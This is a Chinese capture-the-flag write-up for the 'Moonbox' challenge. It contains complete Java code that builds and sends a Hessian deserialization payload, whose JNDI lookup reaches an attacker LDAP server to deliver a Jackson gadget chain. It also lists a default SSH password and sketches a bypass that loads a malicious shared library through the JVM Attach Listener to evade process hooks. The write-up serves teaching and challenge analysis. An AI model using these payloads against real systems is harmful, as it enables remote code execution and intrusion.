# Moonbox

## 题目简述

Moonbox 的预期入口是 agent 的 replay 保存接口。接口接收 Base64 编码的数据，并使用 Hessian 2 反序列化。攻击者可构造 `HashMap → UIDefaults → SwingLazyValue` 对象图，在反序列化恢复哈希表时触发：

```java
new InitialContext().doLookup("ldap://.../deserialJackson")
```

LDAP 服务返回本地 Jackson 反序列化引用，进入后续 gadget chain。请求还需要 agent 自己的签名头，可以直接复用项目中的 `SignUtils.getHeaders()` 生成。

原 WP 的终端截图只包含服务监听信息，已转写如下，不再保留图片：

```text
[JETTYSERVER] Listening on 0.0.0.0:8180
[RMISERVER] Listening on 0.0.0.0:1099
[LDAPSERVER] Listening on 0.0.0.0:1389
[LDAPSERVER] [DeserialJackson] Send local LDAP reference result
```

## 解题过程

### 构造 Hessian 对象图

`SwingLazyValue` 保存在 `UIDefaults` 中。正常调用 `UIDefaults.get("key")` 时，LazyValue 会执行其 `createValue`，这里被配置为调用 `javax.naming.InitialContext.doLookup`。

为了让触发发生在目标反序列化阶段，而不是本地构造或序列化阶段，需要反射伪造 `HashMap$Node` 和 `HashMap.table`：

1. 创建两个分别包含同一 `SwingLazyValue` 的 `UIDefaults`；
2. 手工创建两个 hash 为 0 的 `HashMap$Node`；
3. 把节点直接放入两个 `HashMap` 的 table，并把 size 设为 2；
4. 再把这两个内层 `HashMap` 作为外层 `HashMap` 的键和值；
5. Hessian 在目标端重建外层表时发生哈希碰撞和相等性检查，沿对象图访问 `UIDefaults`，触发 LazyValue。

生成 `poc.ser` 的完整代码如下：

```java
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import sun.swing.SwingLazyValue;

import javax.swing.UIDefaults;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.HashMap;

public class BuildPayload {
    public static void main(String[] args) throws Exception {
        String ldapUrl = args.length == 1
            ? args[0]
            : "ldap://127.0.0.1:1389/deserialJackson";

        SwingLazyValue lazy = new SwingLazyValue(
            "javax.naming.InitialContext",
            "doLookup",
            new Object[]{ldapUrl}
        );

        UIDefaults firstDefaults = new UIDefaults();
        UIDefaults secondDefaults = new UIDefaults();
        firstDefaults.put("key", lazy);
        secondDefaults.put("key", lazy);

        Class<?> nodeClass = Class.forName("java.util.HashMap$Node");
        Constructor<?> nodeConstructor = nodeClass.getDeclaredConstructor(
            int.class,
            Object.class,
            Object.class,
            nodeClass
        );
        nodeConstructor.setAccessible(true);

        Object firstNode = nodeConstructor.newInstance(
            0, firstDefaults, null, null
        );
        Object secondNode = nodeConstructor.newInstance(
            0, secondDefaults, null, null
        );

        Object tableValue = Array.newInstance(nodeClass, 2);
        Array.set(tableValue, 0, firstNode);
        Array.set(tableValue, 1, secondNode);

        Field sizeField = HashMap.class.getDeclaredField("size");
        Field tableField = HashMap.class.getDeclaredField("table");
        sizeField.setAccessible(true);
        tableField.setAccessible(true);

        HashMap<Object, Object> firstMap = new HashMap<>();
        HashMap<Object, Object> secondMap = new HashMap<>();
        for (HashMap<Object, Object> map : new HashMap[]{
                firstMap, secondMap}) {
            sizeField.set(map, 2);
            tableField.set(map, tableValue);
        }

        HashMap<Object, Object> root = new HashMap<>();
        root.put(firstMap, firstMap);
        root.put(secondMap, secondMap);

        ByteArrayOutputStream output = new ByteArrayOutputStream();
        SerializerFactory factory = new SerializerFactory();
        factory.setAllowNonSerializable(true);

        Hessian2Output hessian = new Hessian2Output(output);
        hessian.setSerializerFactory(factory);
        hessian.writeObject(root);
        hessian.close();

        Files.write(Path.of("poc.ser"), output.toByteArray());
    }
}
```

该链依赖 `sun.swing.SwingLazyValue` 和对 `java.util.HashMap` 私有字段的反射访问。JDK 9 及以上本地生成时通常需要相应的 `--add-exports` 与 `--add-opens`；目标能否触发仍由目标 JDK、Hessian 版本和依赖集合决定。

### 发送到 replay 保存接口

原代码把接口固定写成 `http://localhost:9999/api/agent/replay/save`。`localhost:9999` 只是部署时的本地 agent 地址，不应作为可复用目标写死；真正稳定的是路径 `/api/agent/replay/save`、签名头与 Base64 请求体。

下面通过命令行参数接收当前实例的完整接口地址：

```java
import com.alibaba.jvm.sandbox.repeater.plugin.core.utils.HttpUtil;
import com.alibaba.jvm.sandbox.repeater.plugin.core.utils.SignUtils;
import com.google.common.io.BaseEncoding;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Map;

public class SendPayload {
    public static void main(String[] args) throws Exception {
        if (args.length != 1) {
            throw new IllegalArgumentException(
                "usage: SendPayload <replay-save-url>"
            );
        }

        Map<String, String> headers = SignUtils.getHeaders();
        headers.put("content-type", "application/json");

        byte[] serialized = Files.readAllBytes(Path.of("poc.ser"));
        String body = BaseEncoding.base64().encode(serialized);

        HttpUtil.Resp response = HttpUtil.invokePostBody(
            args[0],
            headers,
            body
        );
        System.out.println(response);
    }
}
```

LDAP 服务日志出现 `DeserialJackson` 的本地引用响应，说明 `SwingLazyValue` 已成功调用 JNDI；后续是否达到代码执行，需要继续核对 Jackson gadget 与目标防护。

### 非预期入口

题目环境还存在几个绕过预期 Hessian 链的入口：

- agent 上传功能；
- SSH 默认凭据 `root/123456`；
- 取得 agent 权限后直接执行命令或读取日志。

这些是部署面问题，不属于预期反序列化利用。实际环境中默认口令会直接破坏挑战边界，应优先移除。

### 未上线的 d3chain 设计

原总 WP 还附带了一个未在比赛中上线的 `d3chain` 方案，必须与 Moonbox 的已上线预期解区分。该设计用 FST 直接反序列化不可信数据：

```java
FSTConfiguration configuration =
    FSTConfiguration.createDefaultConfiguration();
return configuration.asObject(decoded);
```

依赖中存在 Jackson 对象链，但生成载荷时 `BaseJsonNode.writeReplace` 会替换对象。用 Javassist 将其改成返回对象自身，可保留原始 gadget：

```java
ClassPool pool = ClassPool.getDefault();
CtClass node = pool.get(
    "com.fasterxml.jackson.databind.node.BaseJsonNode"
);
CtMethod writeReplace = node.getDeclaredMethod("writeReplace");
writeReplace.setBody("{ return $0; }");
node.toClass();
```

这里关键是 `return $0`：修改的是序列化阶段的 `writeReplace` 行为，不等同于给目标增加 `readObject`。

该设计还假设 native RASP 已 hook `System.load` 与 `forkAndExec`，直接加载库或启动进程会被拦截。预期绕过分两步：

1. 通过 Java gadget 把恶意 ELF 共享库字节写到 `/tmp/pwn.so`；
2. 连接当前 JVM 的 Attach Listener Unix socket `/tmp/.java_pid<PID>`，发送 `load` 命令，让 JVM 自己 `dlopen` 该文件。

用于验证加载的共享库可以只有一个 constructor：

```c
#include <stdlib.h>

__attribute__((constructor))
static void payload(void)
{
    system("touch /tmp/hack");
}
```

编译命令：

```bash
gcc -shared -fPIC -o pwn.so pwn.c
```

Attach 协议请求由 NUL 分隔的字符串组成：

```text
1\0load\0/tmp/pwn.so\0true\0\0
```

第一项是协议版本 `"1"`。原材料把它写成了 PID 的首字节，这只会在该字节恰好为字符 `1` 时偶然成立，不能作为通用实现。使用 Netty epoll domain socket 发送时，核心数据应明确构造成：

```java
byte[] request = (
    "1\u0000"
    + "load\u0000"
    + "/tmp/pwn.so\u0000"
    + "true\u0000"
    + "\u0000"
).getBytes(java.nio.charset.StandardCharsets.ISO_8859_1);
```

即使共享库缺少完整的 JVMTI agent 导出，`dlopen` 阶段也会先运行 ELF constructor；但 Attach Listener 是否已经启动、socket 权限以及目标 JVM 版本仍需现场验证。原材料中的 `byte[] so = {127, 69, 76, ...}` 是截断示意，不是完整载荷，因此这里不伪装成可直接运行的写文件代码。

## 方法总结

Moonbox 的主链路是“replay 接口接收 Hessian→伪造 HashMap 内部结构→UIDefaults 取值→SwingLazyValue 调用 JNDI→LDAP 返回 Jackson 引用”。对象图的价值在于把危险调用延迟到目标反序列化时，API 层还要满足签名头和 Base64 传输格式。

未上线的 d3chain 使用不同入口：FST/Jackson 负责取得 Java 代码执行，再借 JVM Attach Listener 绕过对 `System.load` 和 `forkAndExec` 的直接 hook。正文保留了 `writeReplace` 修补、Unix socket 路径与 Attach 请求格式，但明确区分了已上线解法、未上线设计和未提供完整字节的示意代码。
